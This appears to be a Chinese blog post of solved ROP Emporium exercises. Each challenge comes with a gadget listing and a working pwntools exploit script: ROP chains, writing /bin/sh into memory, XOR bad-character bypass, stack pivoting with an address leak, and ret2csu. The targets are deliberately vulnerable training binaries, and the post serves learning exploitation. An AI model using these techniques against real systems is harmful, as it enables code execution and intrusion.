---
title: ROP Emporium 练习记录
date: 2019-12-09 15:02:43
tags:
  - 栈漏洞
categories:
  - 二进制安全
featuredImage: 0.png
---

针对 ROP 学习了一下，就记录一下 64 位的做法，32 位同理。不知道为什么对这个网站特别有好感。

<!--more-->

## ret2win

最简单的 `ret2text`，给了到 `ebp` 的偏移量，只需要找到函数 `ret2win` 的地址返回过去即可。

```python
from pwn import *

p = process('./ret2win')
elf = ELF('./ret2win')

p.recvuntil('>')

payload = 'a'*0x28 + p64(elf.symbols['ret2win'])
p.sendline(payload)

p.interactive()
```

## split

拆开了 `system` 和 `/bin/cat flag.txt`，因此找到两者地址，准备好参数后返回到 `system` 上即可。

注意在 32 位上，只需要先放 `system` 地址，随后填充 4 字节返回地址，再放 `/bin/cat flag.txt` 地址即可。而 64 位上传参需要控制 `rdi` 寄存器，因此需要 `pop rdi; ret`。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./split')
elf = ELF('./split')

p.recvuntil('>')

pop_rdi_ret = 0x400883
bin_cat_flag = 0x601060

payload = flat(['a'*0x28, pop_rdi_ret, bin_cat_flag, elf.plt['system']])
p.sendline(payload)

p.interactive()
```

## callme

题目要求是依次调用 `callme_one(1,2,3)`，`callme_two(1,2,3)`，`callme_three(1,2,3)`。要控制三个参数就需要三个寄存器 `rdi rsi rdx`，我们恰好能找到一条语句：

```
0x0000000000401ab0 : pop rdi ; pop rsi ; pop rdx ; ret
```

之后就是布置好参数了：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./callme')
elf = ELF('./callme')

p.recvuntil('>')

pop_rdi_rsi_rdx_ret = 0x401ab0

payload = flat(['a'*0x28, pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_one'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_two'], pop_rdi_rsi_rdx_ret, 1,2,3, elf.plt['callme_three']])
p.sendline(payload)

p.interactive()
```

## write4

`/bin/cat flag.txt` 字符串彻底消失了，题目提示我们需要自己向内存中写入该字符串。`checksec` 可知 GOT 表可写。

为了写 GOT 表，首先要控制寄存器，然后通过 `mov [reg], reg` 这样的语句来执行写操作，因此我们搜索一下：

```shell
$ ROPgadget --binary write4 --only 'mov|pop|ret'
Gadgets information
============================================================
0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret
0x0000000000400821 : mov dword ptr [rsi], edi ; ret
0x00000000004007ae : mov eax, 0 ; pop rbp ; ret
0x0000000000400820 : mov qword ptr [r14], r15 ; ret
0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400890 : pop r14 ; pop r15 ; ret
0x0000000000400892 : pop r15 ; ret
0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret
0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop rbp ; ret
0x0000000000400893 : pop rdi ; ret
0x0000000000400891 : pop rsi ; pop r15 ; ret
0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005b9 : ret
```

按照上述需求，我们可以选择布置好栈，执行 `pop r14 ; pop r15 ; ret` 控制 `r14` 和 `r15`，随后 `mov qword ptr [r14], r15 ; ret` 进行写操作，最后 `pop rdi ; ret` 把写好的 `/bin/sh`（总觉得拿到 shell 比读到 flag 更厉害一点）作为参数传入，需要注意的是字符串需要 8 字节对齐。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./write4')
elf = ELF('./write4')

p.recvuntil('>')

got_start = 0x601000
pop_r14_r15_ret = 0x400890
mov_r14_r15_ret = 0x400820
pop_rdi_ret = 0x400893

payload = flat(['a'*0x28, pop_r14_r15_ret, got_start,'/bin/sh'.ljust(8,'\x00'), mov_r14_r15_ret, pop_rdi_ret, got_start, elf.plt['system']])
p.sendline(payload)

p.interactive()
```

## badchars

题目屏蔽了一些关键字符，并提示了 `XOR`，也就是说我们可以先写入被异或的关键字符，随后通过 gadgets 把它们异或回来。

题目告诉了我们被屏蔽的字符，所以我们可以先通过 `--badbytes` 选项避免指令地址中含有这些字符：

```shell
$ ROPgadget --binary badchars --only 'mov|pop|ret' --badbytes '62|69|63|2f|20|66|6e|73'
```

随后，我们构造异或字符串，与 2 异或即可：

```python
s = '/bin/sh'.ljust(8,'\x00')
for i in range(len(s)):
  print hex(ord(s[i]) ^ 2)
```

得到：

```python
bin_sh = 0x026a712d6c6b602d
```

注意后面会被认为是小端法，所以这里倒序写。

然后，我们挑选如下的 gadgets：

```
pop r12 ; pop r13 ; ret
mov qword ptr [r13], r12 ; ret

pop r14 ; pop r15 ; ret
xor byte ptr [r15], r14b ; ret

pop rdi ; ret
```

第 1,2,5 行和前面一样，而第 3-4 行控制寄存器 `r14` 和 `r15` 的值，使得 `r14=2`（`r14b` 即 `r14` 的低 8 位），`r15` 存放我们刚刚写入的被异或的字符串地址，随后进行 8 次异或即可恢复出 `/bin/sh\x00` 来。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./badchars')
elf = ELF('./badchars')

p.recvuntil('>')

bin_sh = 0x026a712d6c6b602d
got_start = 0x601000
pop_r12_r13_ret = 0x400b3b
mov_r13_r12_ret = 0x400b34

pop_r14_r15_ret = 0x400b40
xor_r15_r14b_ret = 0x400b30

pop_rdi_ret = 0x400b39

payload = flat(['a'*0x28, pop_r12_r13_ret, bin_sh, got_start, mov_r13_r12_ret])

for i in range(8):
    payload += flat([pop_r14_r15_ret, 2, got_start+i, xor_r15_r14b_ret])

payload += flat([pop_rdi_ret, got_start, elf.plt['system']])
p.sendline(payload)

p.interactive()
```

## fluff

本题减少了一些 gadget，我们不得不间接地通过寄存器写内存。注意这里用 ROPgadget 很难找到合适的 gadget，需要加个 `--depth` 参数。

```shell
$ ROPgadget --binary fluff --depth 20
```

在众多 gadget 中要找到有用的，我们的思路还是如何去写内存。按照之前经验，还是需要 `mov [reg], reg` 的语句，这里就有一个：

```
0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
```

但是很不巧，没有 `pop r10; pop r11; ret` 这么好的 gadget 了，我们只能另辟蹊径去控制这两个寄存器。首先我们要把 GOT 表地址放进 `r10`。然而我们连 `xor r10, reg` 这样的语句都没有，非常难受（`xor [r10], reg` 是没有用的，因为无法改变 `r10` 本身）。

但是我们注意到，有这样一个 gadget：

```
0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
```

这里可以交换 `r11` 和 `r10` 的值，那么我们是不是可以通过控制 `r11`，然后最后让它和 `r10` 交换从而控制 `r10` 呢？

我们发现是可以的，因为有：

```
0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
```

这两个 gadget 让我们想到：我们可以先通过第一个 gadget 清零 `r11`，然后用第二个 gadget 让 `r11` 和 `r12` 异或，此时就等同于 `mov r11, r12` 了。而 `r12` 是很好控制的：

```
0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret
```

这样就可以构造 ROP 链先把地址写入 `r10`：

```python
got_start = 0x601000
xor_r11_r11 = 0x400822
pop_r12 = 0x400832
xor_r11_r12 = 0x40082f
xchg_r11_r10 = 0x400840

payload = flat(['a'*40, xor_r11_r11,'a'*8, pop_r12, got_start, xor_r11_r12,'a'*8, xchg_r11_r10,'a'*8])
```

这里的 `'a'*8` 是为了解决后面的无用 `pop`。

第二步，向 `r11` 写入 `/bin/sh\x00`，其实和上面同理：

```python
payload += flat([xor_r11_r11,'a'*8, pop_r12,'/bin/sh'.ljust(8,'\x00'), xor_r11_r12,'a'*8])
```

第三步，向 `r10` 中的地址写入 `r11` 中的数据，需要注意的是由于该 gadget 后半部分会 `pop r12` 并且将 `r12` 也去和 `r10` 中的地址存放的值异或，此时我们必须控制 `r12` 为 0：

```python
mov_r10_r11 = 0x40084e
pop_rdi_ret = 0x4008c3
payload += flat([mov_r10_r11,'a'*8, 0, pop_rdi_ret, got_start, elf.plt['system']])
```

## pivot

`stack pivoting` 就是在栈空间较小的情况下，把 `esp` 移到别的地方去，这样就能有更多空间写 ROP 链了。

这一关大意是要调用 `libpivot.so` 中的 `ret2win` 函数，也就是第一关的那个。此外，还有个 `uselessFunction` 里调用了 `libpivot.so` 里的 `foothold_function`。

IDA 得到的源码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char *ptr; // ST08_8

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("pivot by ROP Emporium");
  puts("64bits\n");
  ptr = (char *)malloc(0x1000000uLL);
  pwnme(ptr + 16776960);
  free(ptr);
  puts("\nExiting");
  return 0;
}

char *__fastcall pwnme(char *a1)
{
  char s; // [rsp+10h] [rbp-20h]

  memset(&s, 0, 0x20uLL);
  puts("Call ret2win() from libpivot.so");
  printf("The Old Gods kindly bestow upon you a place to pivot: %p\n", a1);
  puts("Send your second chain now and it will land there");
  printf("> ");
  fgets(a1, 256, stdin);
  puts("Now kindly send your stack smash");
  printf("> ", 256LL);
  return fgets(&s, 64, stdin);
}
```

注意到这里的 `a1` 会被打印出来，随后被 `fgets` 写入。我们想尝试让 `rsp` 指向 `a1` 来改变 `rsp` 位置。这个比较简单，只需要 gadget：

```
pop rax; ret
xchg rax, rsp; ret
```

通过 `pop rax` 把 `a1` 的地址写入 `rax`，然后交换，那么 `rsp` 就指向了 `a1`，我们完成了 `stack pivoting`。

这题容易搞混的地方是，我们的思路是先填 `first stage` 进行 `stack pivoting`（也就是上述过程），再填 `second stage` 调用 `ret2win`，但是程序中输入的顺序是相反的。

下面我们来看 `second stage`，也就是考虑我们要先输入什么。我们最终肯定是想返回到 `ret2win`，但是我们不知道它的地址。`checksec libpivot.so` 可以发现还开启了 ASLR。因此可以想到这里 `foothold_function` 就是用来定位用的。

首先（通过 `.plt`）调用一次 `foothold_function` 更新其 `.got.plt`，随后将**这个 `.got.plt` 项的地址** `pop` 给 `rax`，接着读取 `[rax]` 也就是**这个 `.got.plt` 项的内容**，即得到了 `foothold_function` 真实地址。

最后，可以根据它在 `libpivot.so` 中到 `ret2win` 的相对偏移来拿到 `ret2win` 的真实地址。这个相对偏移可以通过 `nm libpivot.so` 得到：前者在 `0x0970`，后者在 `0x0abe`，相差 `0x14e`。最后我们还是利用 gadget 计算出 `ret2win` 的真实地址后，`call` 一下即可。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./pivot')
elf = ELF('./pivot')

p.recvuntil('pivot:')
a1 = int(p.recvuntil('\n'), 16)
print hex(a1)

foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']
pop_rax_ret = 0x400b00
mov_rax_rax = 0x400b05
pop_rbp_ret = 0x400900
add_rax_rbp = 0x400b09
call_rax = 0x40098e

payload = flat([foothold_plt, pop_rax_ret, foothold_got, mov_rax_rax, pop_rbp_ret, 0x14e, add_rax_rbp, call_rax])

p.recvuntil('>')
p.sendline(payload)

xchg_rax_rsp = 0x400b02
payload = flat(['a'*0x28, pop_rax_ret, a1, xchg_rax_rsp])

p.recvuntil('>')
p.sendline(payload)

p.interactive()
```

## ret2csu

这题要求我们调用 `ret2win` 但是第三个参数必须是 `0xdeadcafebabebeef`，并且 ROPgadget 几乎找不到有用的 gadget 比如 `pop rdx; ret`。结合题目名可知本题需要采用 [ret2csu](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf) 的技巧。

在 `__libc_csu_init` 中，有 gadget1：

```asm
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
```

和 gadget2：

```asm
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    qword ptr [r12+rbx*8]
```

可以看到，这里 `rdx, rsi, edi` 正好是 64 位下函数的前三个参数，而它们的值在这里来源于 `r15, r14, r13d`，后三者又恰好可以被 gadget1 控制；而最后一句 `call` 中的 `r12` 和 `rbx` 我们同样可以在 gadget1 中控制。

然而，gadget2 不是以 `ret` 结尾的，这样我们必须考虑它后面的汇编代码依旧能正常执行下去：

```asm
add     rbx, 1
cmp     rbp, rbx
jnz     short loc_400880

add     rsp, 8
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
```

这里为了让它继续向下执行，我们不妨让 `rbx=0; rbp=1`；至于下面多余的 `pop` 就用填充处理掉就好了。

最后还有一个 `call qword ptr [r12+rbx*8]` 是我们可控的，但是这里尝试调用 `ret2win` 是会引起段错误的，不能直接调用。我们只有不引起段错误，才能让 gadget2 成功执行到 `ret`，那么我们就想随便调用一个不会改变 `rdx` 的值的函数。

例如，可以调用 `.dynamic` 段的 `_fini`，这个函数非常简单：

```asm
sub    rsp,0x8
add    rsp,0x8
ret
```

那么我们控制 `r12` **指向** `_fini` 即可，因为 `rbx` 会被我们设置为 0 所以不用考虑。注意是指向，也就是说 `[r12]` 才是 `_fini` 的地址，后者可以 `gdb` 中 `info func` 得到在 `0x4008b4`，但是我们需要赋值给 `r12` 的实际上是指向 `0x4008b4` 这个地址的指针。

我们可以这样看：

```
pwndbg> x/20x &_DYNAMIC
0x600e20:    0x00000001    0x00000000    0x00000001    0x00000000
0x600e30:    0x0000000c    0x00000000    0x00400560    0x00000000
0x600e40:    0x0000000d    0x00000000    0x004008b4    0x00000000
0x600e50:    0x00000019    0x00000000    0x00600e10    0x00000000
0x600e60:    0x0000001b    0x00000000    0x00000008    0x00000000
```

可以看到在 `0x600e48` 的指针指向 `0x4008b4`，这就是我们要赋值给 `r12` 的值。

```python
from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./ret2csu')
elf = ELF('./ret2csu')

p.recvuntil('>')

ret2win = elf.symbols['ret2win']
gadget1 = 0x40089a
gadget2 = 0x400880
fini_p = 0x600e48
arg3 = 0xdeadcafebabebeef

payload = flat(['a'*0x28, gadget1, 0, 1, fini_p, 0, 0, arg3, gadget2,0,0,0,0,0,0,0, ret2win])

p.sendline(payload)
p.interactive()
```
